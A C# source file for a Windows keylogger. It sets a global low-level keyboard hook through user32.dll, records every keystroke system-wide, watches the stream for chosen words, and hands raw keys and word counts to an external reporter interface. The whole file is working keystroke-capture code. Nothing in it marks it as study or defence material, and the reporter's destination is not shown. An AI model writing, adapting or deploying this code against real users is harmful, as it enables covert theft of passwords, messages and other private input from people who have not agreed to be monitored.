using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Input;
using reporter;

namespace keyLogger
{
    public class KeyLogger
    {
        private List<string> _observeWords;
        public ReadOnlyCollection<string> ObserveWords;
        private static List<Keys> _keyReports = new();
        public static ReadOnlyCollection<Keys> Reports = new(_keyReports);
        private List<string> _wordsReport = new List<string>();
        public ReadOnlyCollection<string> WordsReport;
        private KeyLogger()
        {
            _observeWords = new List<string>();
            ObserveWords = new ReadOnlyCollection<string>(_observeWords);
            WordsReport = new ReadOnlyCollection<string>(_wordsReport);
            KeyDown += ( key) =>
            {
                _keyReports.Add(key);
            };

        }

        public void StartObserveWords()
        {
            KeyDown += _checkForWords;
        }

        public void StopObserveWords()
        {
            KeyDown -= _checkForWords;
        }
        private void _checkForWords( Keys key)
        {
            foreach (var word in _observeWords)
            {
                Task.Factory.StartNew(()=>_observeWord(word));
            }
        }

        public event Action FindMatchingWord;
        private void _observeWord(string word)
        {
            if (_keyReports.Count < word.Length)
                return;
            var start = _keyReports.Count - word.Length;
            string keyWord = "";
            for (int i = start; i < _keyReports.Count; i++)
            {
                keyWord += _keyReports[i].ToString();
            }
            if(word.Equals(keyWord,StringComparison.CurrentCultureIgnoreCase))
            {
                _wordsReport.Add(word);
                FindMatchingWord?.Invoke();
            }
        }

        public static void ReportKeys(IReport reporter)
        {
            foreach (var key in _keyReports)
            {
                reporter.Report(key.ToString());
            }
            _keyReports.Clear();
        }

        public void ReportWords(IReport reporter)
        {
            StringBuilder stats=new StringBuilder();
            stats.AppendLine(DateTime.Now.ToLongTimeString() + '\n');
            var top = _wordsReport.GroupBy(w => w).OrderByDescending(w=>w.Count());
            foreach (var wordGroup in top)
            {
                stats.AppendLine($"{wordGroup.Key} - {wordGroup.Count()}");
            }
            reporter.Report(stats.ToString());
            _wordsReport.Clear();
        }
        public List<string> GetWords() => _observeWords.Select(x => x.ToString()).ToList();

        private static KeyLogger _instance;
        public static KeyLogger Instance => _instance ??= new KeyLogger();

        public void AddWord(string word)
        {
            if (string.IsNullOrEmpty(word) || _observeWords.Contains(word)) return;
            if (word.Length < 4) throw new ArgumentException("Too short");
            _observeWords.Add(word.ToLower());
        }

        public void RemoveWord(string word)
        {
            _observeWords.Remove(word);
        }

        public void UpdateWord(string oldWord, string newWord)
        {
            if (_observeWords.Contains(newWord)) return;

            var index = _observeWords.FindIndex(w => w.Equals(oldWord, StringComparison.CurrentCultureIgnoreCase));
            _observeWords[index] = newWord;
        }
        
        public void StartLogKeys()
        {
            _hookID = SetHook(_proc);
        }
        public void StopLogKeys()
        {
            UnhookWindowsHookEx(_hookID);
        }

        #region Log
        //monitor kb input
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using Process curProcess = Process.GetCurrentProcess();
            using ProcessModule curModule = curProcess.MainModule;
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }

        public static event Action<Keys> KeyDown;

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int code = Marshal.ReadInt32(lParam);
                Keys key = (Keys)code;
                KeyDown?.Invoke(key);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        #endregion
        

    }
}
